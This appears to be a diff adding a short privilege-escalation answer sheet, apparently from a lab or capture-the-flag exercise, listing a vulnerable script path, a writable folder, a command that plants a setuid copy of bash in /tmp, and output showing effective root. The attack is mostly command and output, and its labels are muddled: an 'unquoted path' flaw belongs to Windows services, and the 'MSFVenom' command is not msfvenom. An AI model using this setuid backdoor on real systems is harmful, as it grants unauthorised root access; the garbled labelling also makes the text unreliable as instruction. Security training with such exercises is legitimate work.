@@ -1,0 +1,12 @@
+Vulnerable Service Name (Unquoted Path):
+/usr/local/bin/backup.sh
+
+Path to the Writable Folder:
+/home/limited_user/backups
+
+MSFVenom Payload Command:
+echo 'cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash' > runme.sh
+
+Proof of Execution:
+id
+uid=1001(limited_user) gid=1001(limited_user) euid=0(root) groups=1001(limited_user)
